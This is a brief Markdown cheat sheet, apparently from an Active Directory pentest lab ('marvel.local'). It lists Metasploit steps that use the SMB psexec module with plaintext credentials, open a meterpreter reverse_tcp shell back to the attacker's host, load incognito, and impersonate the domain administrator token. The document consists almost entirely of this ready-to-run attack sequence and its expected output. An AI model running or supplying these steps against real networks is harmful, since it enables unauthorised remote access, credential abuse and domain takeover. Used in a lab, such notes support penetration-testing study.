- - -
## Attacking Steps ( Metasploit ):

```sh
msfconsole
```

```Console
use exploit/windows/smb/psexec
set RHOSTS
set SMBDomain marvel.local
set SMBUser Thor
set SMBPass Password1
show targets ( change it if not worked )
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set LHOST
exploit

meterpreter> getuid
< NT-Authority >

meterpreter> load incognito
meterpreter> list tokens -u ( -u = users, -g = groups )
meterpreter> impersonate_token marvel\\administrator
meterpreter> shell
C:\Windows\system32 whoami
< marvel\administrator >


```

- - -
